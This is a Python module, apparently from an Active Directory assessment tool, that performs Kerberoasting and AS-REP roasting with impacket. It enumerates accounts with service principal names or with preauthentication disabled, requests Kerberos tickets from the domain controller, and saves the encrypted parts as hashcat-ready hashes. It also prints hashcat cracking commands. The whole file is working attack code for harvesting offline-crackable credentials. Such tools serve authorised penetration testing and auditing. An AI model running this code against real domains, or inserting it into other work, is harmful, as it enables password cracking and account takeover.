import os
import datetime
from rich.console import Console

from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5 import constants
from impacket.krb5.types import Principal, KerberosTime
from impacket.krb5.asn1 import (
    AS_REQ, AS_REP, TGS_REQ, TGS_REP, seq_set, seq_set_iter,
)
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from impacket.krb5.ccache import CCache
import socket

from utils.connection import ADConnection
from utils.output import (print_section, print_info, print_warn,
                          print_finding, make_table, register_result)
from utils.helpers import safe_str

console = Console()

USER_ATTRS = [
    "sAMAccountName", "userPrincipalName", "servicePrincipalName",
    "userAccountControl", "memberOf",
]


def _do_kerberoast(domain: str, dc_ip: str, username: str, password: str,
                   ntlm_hash: str, use_kerberos: bool, spn_users: list,
                   out_file: str = None) -> list:
    """Use impacket to request TGS tickets and extract hashes."""
    hashes = []

    try:
        lm_hash = ""
        nt_hash = ""
        if ntlm_hash:
            if ":" in ntlm_hash:
                lm_hash, nt_hash = ntlm_hash.split(":", 1)
            else:
                nt_hash = ntlm_hash

        domain_upper = domain.upper()
        user_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        tgt, cipher, old_session_key, session_key = getKerberosTGT(
            clientName=user_principal,
            password=password or "",
            domain=domain_upper,
            lmhash=bytes.fromhex(lm_hash) if lm_hash else b"",
            nthash=bytes.fromhex(nt_hash) if nt_hash else b"",
            aesKey=b"",
            kdcHost=dc_ip,
        )

        for sam, spns in spn_users:
            for spn in spns:
                try:
                    server_name = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
                    tgs, cipher2, _, session_key2 = getKerberosTGS(
                        serverName=server_name,
                        domain=domain_upper,
                        kdcHost=dc_ip,
                        tgt=tgt,
                        cipher=cipher,
                        sessionKey=session_key,
                    )

                    tgs_rep = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
                    enc_part = tgs_rep["enc-part"]
                    etype = int(enc_part["etype"])
                    cipher_text = bytes(enc_part["cipher"])

                    if etype == 23:
                        hash_str = (
                            f"$krb5tgs$23$*{sam}${domain_upper}${spn}*"
                            f"${cipher_text[:16].hex()}${cipher_text[16:].hex()}"
                        )
                    elif etype in (17, 18):
                        hash_str = (
                            f"$krb5tgs${etype}$*{sam}${domain_upper}${spn}*"
                            f"${cipher_text[:16].hex()}${cipher_text[16:].hex()}"
                        )
                    else:
                        hash_str = f"# Unknown etype {etype} for {sam}/{spn}"

                    hashes.append({"account": sam, "spn": spn, "hash": hash_str})
                    console.print(f"  [bright_green]✔[/bright_green] TGS obtained for [bright_yellow]{sam}[/bright_yellow] — {spn}")
                except Exception as ex:
                    console.print(f"  [red]✘[/red] Failed TGS for {sam} / {spn}: {ex}")
    except Exception as ex:
        print_warn(f"Could not perform Kerberoasting: {ex}")

    return hashes


def _do_asrep_roast(domain: str, dc_ip: str, accounts: list,
                    out_file: str = None) -> list:
    from impacket.krb5.kerberosv5 import sendReceive
    from impacket.krb5.asn1 import AS_REQ, AS_REP, KERB_PA_PAC_REQUEST
    from impacket.krb5.types import KerberosTime, Principal
    from impacket.krb5 import constants
    from pyasn1.codec.der import decoder, encoder
    from pyasn1.type.univ import noValue
    import datetime

    hashes = []

    for sam in accounts:
        try:
            client_name = Principal(sam, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            as_req = AS_REQ()
            as_req["pvno"] = 5
            as_req["msg-type"] = 10

            request_body = as_req["req-body"]
            request_body["kdc-options"] = constants.encodeFlags([])
            seq_set(request_body, "sname", Principal("krbtgt", type=constants.PrincipalNameType.NT_SRV_INST.value).components_to_asn1)
            seq_set(request_body, "cname", client_name.components_to_asn1)
            request_body["realm"] = domain.upper()
            now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
            request_body["till"] = KerberosTime.to_asn1(now)
            request_body["rtime"] = KerberosTime.to_asn1(now)
            request_body["nonce"] = 12345
            seq_set_iter(request_body, "etype", [constants.EncryptionTypes.rc4_hmac.value])

            message = encoder.encode(as_req)
            r = sendReceive(message, domain.upper(), dc_ip)
            rep = decoder.decode(r, asn1Spec=AS_REP())[0]

            enc_part = rep["enc-part"]
            etype = int(enc_part["etype"])
            cipher_text = bytes(enc_part["cipher"])

            hash_str = (
                f"$krb5asrep${etype}${sam}@{domain.upper()}:"
                f"{cipher_text[:16].hex()}${cipher_text[16:].hex()}"
            )
            hashes.append({"account": sam, "hash": hash_str})
            console.print(f"  [bright_green]✔[/bright_green] AS-REP captured for [bright_yellow]{sam}[/bright_yellow]")
        except Exception as ex:
            console.print(f"  [red]✘[/red] AS-REP failed for {sam}: {ex}")

    return hashes


def run(conn: ADConnection, output_dir: str = "."):
    print_section("Kerberoasting & AS-REP Roasting")

    result = {"kerberoastable": [], "asreproastable": [], "hashes": []}

    kerb_entries = conn.search(
        "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)"
        "(!userAccountControl:1.2.840.113556.1.4.803:=2))",
        ["sAMAccountName", "servicePrincipalName", "userAccountControl"],
    )

    spn_users = []
    for e in kerb_entries:
        sam = safe_str(e["sAMAccountName"])
        spns = e["servicePrincipalName"].values if e["servicePrincipalName"] else []
        if spns:
            spn_users.append((sam, list(spns)))

    print_info(f"Kerberoastable accounts: {len(spn_users)}")

    if spn_users:
        console.print(make_table(
            "Kerberoastable Accounts",
            ["Account", "SPN(s)"],
            [[sam, "\n".join(spns)] for sam, spns in spn_users],
        ))
        result["kerberoastable"] = [{"account": s, "spns": sp} for s, sp in spn_users]

    asrep_entries = conn.search(
        "(&(objectCategory=person)(objectClass=user)"
        "(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
        ["sAMAccountName"],
    )

    asrep_accounts = [safe_str(e["sAMAccountName"]) for e in asrep_entries]
    print_info(f"AS-REP Roastable accounts: {len(asrep_accounts)}")

    if asrep_accounts:
        console.print(make_table(
            "AS-REP Roastable Accounts",
            ["Account"],
            [[a] for a in asrep_accounts],
        ))
        result["asreproastable"] = asrep_accounts

    if conn.username and (conn.password or conn.ntlm_hash or conn.use_kerberos):
        try:
            dc_ip = socket.gethostbyname(conn.dc_host)
        except Exception:
            dc_ip = conn.dc_host

        if spn_users:
            console.print()
            console.print("[bright_cyan]► Requesting TGS tickets (Kerberoasting)...[/bright_cyan]")
            kerb_hashes = _do_kerberoast(
                domain=conn.domain, dc_ip=dc_ip,
                username=conn.username, password=conn.password,
                ntlm_hash=conn.ntlm_hash, use_kerberos=conn.use_kerberos,
                spn_users=spn_users,
            )
            if kerb_hashes:
                hash_file = os.path.join(output_dir, "kerberoast_hashes.txt")
                with open(hash_file, "w") as f:
                    for h in kerb_hashes:
                        f.write(h["hash"] + "\n")
                print_finding("high", f"{len(kerb_hashes)} TGS hash(es) saved",
                              f"Crack with: hashcat -m 13100 {hash_file} wordlist.txt")
                result["hashes"].extend(kerb_hashes)

        if asrep_accounts:
            console.print()
            console.print("[bright_cyan]► Requesting AS-REP hashes...[/bright_cyan]")
            asrep_hashes = _do_asrep_roast(
                domain=conn.domain, dc_ip=dc_ip,
                accounts=asrep_accounts,
            )
            if asrep_hashes:
                hash_file = os.path.join(output_dir, "asrep_hashes.txt")
                with open(hash_file, "w") as f:
                    for h in asrep_hashes:
                        f.write(h["hash"] + "\n")
                print_finding("high", f"{len(asrep_hashes)} AS-REP hash(es) saved",
                              f"Crack with: hashcat -m 18200 {hash_file} wordlist.txt")
                result["hashes"].extend(asrep_hashes)
    else:
        print_warn("No credentials provided — skipping live ticket requests.")
        print_info("Re-run with -u / -p / --hash to capture actual hashes.")

    register_result("Kerberoasting & AS-REP Roasting", result)
